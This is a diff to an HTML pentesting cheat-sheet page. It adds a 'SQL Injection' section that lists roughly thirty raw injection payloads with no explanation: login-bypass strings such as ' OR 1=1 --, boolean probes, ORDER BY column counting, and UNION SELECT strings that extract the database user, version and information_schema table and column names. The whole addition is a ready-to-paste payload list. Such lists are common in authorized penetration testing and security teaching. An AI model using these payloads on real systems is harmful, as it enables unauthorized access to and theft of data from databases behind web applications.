@@ -212,6 +212,38 @@ burpsuite -127.0.0.1 8080<br>
 intercept on<br>
 analyze network traffic
 </p>
+    <h3>SQL Injection</h3>
+<p>
+' OR 1=1 -- <br>
+' OR 1=1# <br>
+' OR '1'='1' -- <br>
+' OR '1'='1'# <br>
+" OR "1"="1" -- <br>
+" OR "1"="1"# <br>
+admin' -- <br>
+admin' # <br>
+' OR ''=' <br>
+' OR 'x'='x <br>
+' OR 'a'='a <br>
+') OR ('1'='1 -- <br>
+') OR ('a'='a -- <br>
+' AND 1=1 -- <br>
+' AND 1=2 -- <br>
+' AND 'a'='a <br>
+' AND 'a'='b <br>
+' ORDER BY 1 -- <br>
+' ORDER BY 2 -- <br>
+' ORDER BY 3 -- <br>
+' ORDER BY 4 -- <br>
+' UNION SELECT NULL -- <br>
+' UNION SELECT NULL,NULL -- <br>
+' UNION SELECT NULL,NULL,NULL -- <br>
+' UNION SELECT 1,2 -- <br>
+' UNION SELECT user(),database() -- <br>
+' UNION SELECT version(),database() -- <br>
+' UNION SELECT table_name,NULL FROM information_schema.tables -- <br>
+' UNION SELECT column_name,NULL FROM information_schema.columns -- <br>
+</p>
 
 </body>
     <button onclick="toggleMode()">Toggle Dark/Light Mode</button>
